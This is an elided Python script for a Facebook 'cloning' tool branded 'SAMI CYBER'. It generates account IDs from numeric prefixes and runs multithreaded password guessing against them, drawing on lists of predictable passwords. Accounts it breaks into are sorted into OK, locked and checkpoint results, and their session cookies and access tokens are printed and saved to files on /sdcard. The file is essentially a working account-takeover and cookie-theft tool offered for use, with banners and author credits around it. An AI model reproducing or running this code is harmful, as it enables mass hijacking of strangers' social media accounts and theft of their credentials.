...
╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝
   ...
   \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
   ║  \x1b[97m\033[37;41m  ASKED YOU PAPA HWO I AM SAMI   \033[0;m   \33[1;92m    ║
   \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝        """)    
...
jalan('\x1b[1;31mSAMI CYBER  INFINITY CLONING START PLEASE WAIT ..........')
time.sleep(2)
os.system('clear')
loading()
...
def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :SAMI = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :SAMI = ' √ 2009'
        elif uid[:8] in ['10000000']        :SAMI = ' √ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:SAMI = ' √ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:SAMI = ' 2010'
        elif uid[:6] in ['100001']          :SAMI = ' √ 2010/2011'
        elif uid[:6] in ['100002','100003'] :SAMI = ' √ 2011/2012'
        elif uid[:6] in ['100004']          :SAMI = ' √ 2012/2013'
        elif uid[:6] in ['100005','100006'] :SAMI = ' √ 2013/2014'
        elif uid[:6] in ['100007','100008'] :SAMI = ' √ 2014/2015'
        elif uid[:6] in ['100009']          :SAMI = ' √ 2015'
        elif uid[:5] in ['10001']           :SAMI = ' √ 2015/2016'
        elif uid[:5] in ['10002']           :SAMI = ' √ 2016/2017'
        elif uid[:5] in ['10003']           :SAMI = ' √ 2018/2019'
        elif uid[:5] in ['10004']           :SAMI = ' √ 2019/2020'
        elif uid[:5] in ['10005']           :SAMI = ' √ 2020'
        elif uid[:5] in ['10006','10007','']:SAMI = ' √ 2021'
        elif uid[:5] in ['10008']           :SAMI = ' √ 2022'
        elif uid[:5] in ['10009']           :SAMI = ' √ 2023'
        else:SAMI=''
...
╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝
    ...
    \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
     {H} ╔════════════════════════{M}════════════════╗
      {H}║{M}[{H}•{M}] AUTHOR    :{H} SAMI CYBER             {N}{M}║
      {H}║{M}[{H}•{M}] FACEBOOK  : {H}MD SAMI          {N}{M}║
...
def main():
    ...
    print(f' ')
    IP = ipm['origin']
    print(f'{M}╔══[•] TOOL NAME : {H}SAMI X')
    print(f'{M}║══[•] YOUR IP   :{H} '+IP)
    print(f'{M}║══[•] VERSION   : {H}INFINITY')
    print(f'{M}╚══[•] CODER NAME: {H}SAMI X')
    print(f' ')
...
def _FUCKER_():
    ...
    print(f' ')
    IP = ipm['origin']
    print(f'{M}╔══[•] TOOL NAME : {H}SAMI GREEN X')
    print(f'{M}║══[•] YOUR IP   :{H} '+IP)
    print(f'{M}║══[•] VERSION   : {H}INFINITY')
    print(f'{M}╚══[•] CODER NAME: {H}SAMI HASAN')
    print(" ")
...
def shbd():
    ...
    print(f"")
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
    print(f'{P}[{H}√{P}]EXAMPLE : {M}TIK TOK /I LOVE YOU/SAMI/DOREMON/OGGY')
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
    ...
    with ThreadPool(max_workers=60) as smiyaaa:    
        ...
        for love in user:
            uid = ff+code+love
            if pp =='1':
                pwx = ([(code+love)[0:6], (love), (code+love),  (xbook), (pok), ('###@@@'), ('#@#@#'), ('SAMI'), ('free fire')])
            elif pp =='2':
                pwx = ([(code+love), (love), (xbook),  (pok), ('###@@@'), ('#@#@#'), ('SAMI'), ('free fire')])
            elif pp =='3':
                pwx = ([(code+love)[0:8], (love), (code+love), (xbook), (pok), ('###@@@'), ('#@#@#'), ('SAMI'), ('free fire')])
            elif pp =='4':
                pwx = ([(code+love)[0:9], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('SAMI'), ('free fire')])
            elif pp =='5':
                pwx = ([(code+love)[0:10], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('SAMI'), ('free fire')])
            elif pp =='6':
                pwx = ([(code+love), (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('SAMI'), ('free fire')])
            elif pp =='7':
                pwx = ([(ff+code+love)[0:12], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('SAMI'), ('free fire')])
            elif pp =='8':
                pwx = ([(ff+code+love)[0:13], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('SAMI'), ('free fire')])
            elif pp =='9':
                pwx = ([(ff+code+love), (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('SAMI'), ('free fire')])
            if pom =='1':
...
def shind():
    ...
    with ThreadPool(max_workers=60) as smiyaaa:    
        ...
        for love in user:
            uid = ff+code+love
            if pp =='1':
                pwx = ([(code+love)[0:6], (love), (code+love), (pok), ('57273200'), ('SAMI'), ('free fire')])
            elif pp =='2':
                pwx = ([(code+love), (love), (code+love), (pok), ('SAMI'), ('57273200'), ('free fire')])
            elif pp =='3':
                pwx = ([(code+love)[0:8], (love), (code+love), (pok), ('SAMI'), ('57273200'), ('free fire')])
            elif pp =='4':
                pwx = ([(code+love)[0:9], (love), (code+love), (pok), ('SAMI'), ('57273200'), ('free fire')])
            elif pp =='5':
                pwx = ([(code+love)[0:10], (love), (code+love), (pok), ('SAMI'), ('57273200'), ('free fire')])
            elif pp =='6':
                pwx = ([(code+love), (love), (code+love), (pok), ('SAMI'), ('57273200'), ('free fire')])
            elif pp =='7':
                pwx = ([(ff+code+love)[0:12], (love), (code+love), (pok), ('SAMI'), ('57273200'), ('free fire')])
            elif pp =='8':
                pwx = ([(ff+code+love)[0:13], (love), (code+love), (pok), ('SAMI'), ('57273200'), ('free fire')])
            elif pp =='9':
                pwx = ([(ff+code+love), (love), (code+love), (pok), ('SAMI'), ('57273200'), ('free fire')])
            if pom =='1':
                smiyaaa.submit(m,uid,pwx,tl)
            elif pom =='2':
                smiyaaa.submit(n,uid,pwx,tl)
...
def shpak():
    ...
    with ThreadPool(max_workers=60) as smiyaaa:    
        ...
        for love in user:
            uid = ff+code+love
            if pp =='1':
                pwx = ([(code+love)[0:6], (love), (code+love), (pok), ('SAMI'), ('free fire')])
            elif pp =='2':
                pwx = ([(code+love), (love), (code+love), (pok), ('SAMI'), ('free fire')])
            elif pp =='3':
                pwx = ([(code+love)[0:8], (love), (code+love), (pok), ('SAMI'), ('free fire')])
            elif pp =='4':
                pwx = ([(code+love)[0:9], (love), (code+love), (pok), ('SAMI'), ('free fire')])
            elif pp =='5':
                pwx = ([(code+love)[0:10], (love), (code+love), (pok), ('SAMI'), ('free fire')])
            elif pp =='6':
                pwx = ([(code+love), (love), (code+love), (pok), ('SAMI'), ('free fire')])
            elif pp =='7':
                pwx = ([(ff+code+love)[0:12], (love), (code+love), (pok), ('SAMI'), ('free fire')])
            elif pp =='8':
                pwx = ([(ff+code+love)[0:13], (love), (code+love), (pok), ('SAMI'), ('free fire')])
            elif pp =='9':
                pwx = ([(ff+code+love), (love), (code+love), (pok), ('SAMI'), ('free fire')])
            if pom =='1':
                smiyaaa.submit(m,uid,pwx,tl)
            elif pom =='2':
                smiyaaa.submit(n,uid,pwx,tl)
...
def gmail():
    ...
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print(f'   \033[1;92m NAME: {P}[{H}SAMI{P}][{B}MASUD{P}][{K}MAHIN{P}][{K}FAHIM{P}]')
    print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
    print("")
    ff = input(f' CHOOSE :{H} ')
    gg = ff.lower()
...
def m(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            SAMI = random.choice(["\x1b[1;91mSAMI","\x1b[1;92mSAMI","\x1b[1;93mSAMI","\x1b[1;94mSAMI","\x1b[1;95mSAMI","\x1b[1;96mSAMI","\x1b[1;97mSAMI","\x1b[1;91mSAMI","\x1b[1;92mSAMI","\x1b[1;93mSAMI","\x1b[1;94mSAMI","\x1b[1;95mSAMI","\x1b[1;96mSAMI"])
            sys.stdout.write(f'\r    {P}[{SAMI}{P}][{K}%s{P}/{B}%s{P}][{H}OK{P}/{M}LOK{P}/{B}2F{P}]{P}[{H}%s{P}|{M}%s{P}|{B}%s{P}] \r'%(loop,tl,len(ok),len(lok),len(twf))),
            sys.stdout.flush()
            ...
            if 'm_page_voice' in log_cookies:
                ...
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[SAMI-LOK] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                if 'y' in SAMI:
                  print(f'    {B}[COOKI😎] {B}'+coki)
                open('/sdcard/SAMI-LOK.txt', 'a').write(uidf+' | '+ps+'\n')
                lok.append(uidf)
            elif 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[SAMI-OK] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                if 'y' in SAMI:
                  print(f'    {B}[COOKI😎] {B}'+coki)
                open('/sdcard/SAMI-OK.txt', 'a').write(uidf+' | '+ps+'\n')
                ok.append(uidf)
            elif '/x/checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uidf=coki[141:156]
                    if 'y' in hello:
                      print('    \033[1;91m[SAMI-2F] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                      print(f'    {RED}[COOKI😎] {RED}'+coki)
                      open('/sdcard/SAMI-2F.txt', 'a').write(uidf+' | '+ps+'\n')
                    twf.append(uidf)
                    break
            else:
                continue
...
def n(uid,pwx,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mSAMI\033[1;90m]-[{fucker}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(ok)}\033[1;90m]');sys.stdout.flush()
    try:
        for ps in pwx:
            # = random.choice(["\x1b[1;91mSAMI","\x1b[1;92mSAMI","\x1b[1;93mSAMI","\x1b[1;94mSAMI","\x1b[1;95mSAMI","\x1b[1;96mSAMI","\x1b[1;97mSAMI","\x1b[1;91mSAMI","\x1b[1;92mSAMI","\x1b[1;93mSAMI","\x1b[1;94mSAMI","\x1b[1;95mSAMI","\x1b[1;96mSAMI"])
            #sys.stdout.write(f'\r    {P}[{SAMI}{P}][{K}%s{P}/{B}%s{P}][{H}OK]{P}[{H}%s{P}|{M}%s{P}|{B}%s{P}] \r'%(loop,tl,len(ok))),
            #sys.stdout.flush()
            ...
            if 'access_token' in po:
                ...
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[SAMI-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI😎] {B}'+coki)
                open('/sdcard/SAMI-OK.txt','a').write(str(uid)+' | '+ps+' | '+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            animasi = random.choice(["\x1b[1;91mSAMI","\x1b[1;92mSAMI","\x1b[1;93mSAMI","\x1b[1;94mSAMI","\x1b[1;95mSAMI","\x1b[1;96mSAMI","\x1b[1;97mSAMI","\x1b[1;91mSAMI","\x1b[1;92mSAMI","\x1b[1;93mSAMI","\x1b[1;94mSAMI","\x1b[1;95mSAMI","\x1b[1;96mSAMI"])
            ...
            if 'access_token' in po:
                ...
                print('    \033[1;92m[SAMI-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI😎] {B}'+coki)
                open('/sdcard/SAMI-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                ok.append(uidf)
            elif 'www.facebook.com' in po['error_msg']:
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[SAMI-CP] '+uid+' | '+ps)
                print(f'    {B}[COOKI😎] {B}'+coki)
                open('/sdcard/SAMI-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                cp.append(uidf)
                break
